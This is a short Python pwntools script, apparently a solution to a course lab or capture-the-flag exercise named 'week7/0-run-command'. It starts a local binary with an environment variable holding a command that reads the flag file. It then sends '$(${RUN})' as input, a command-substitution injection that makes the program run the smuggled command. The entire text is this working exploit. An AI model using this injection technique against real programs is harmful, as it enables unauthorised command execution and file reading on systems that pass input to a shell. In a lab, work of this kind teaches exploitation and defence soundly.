#!/usr/bin/env python

from pwn import *
import os

p = process ("./run-command", env = {
    "RUN" : "cat /home/labs/week7/0-run-command/flag"
    }
    )
print (p.recv())
p.sendline('$(${RUN})')
print (p.recv())
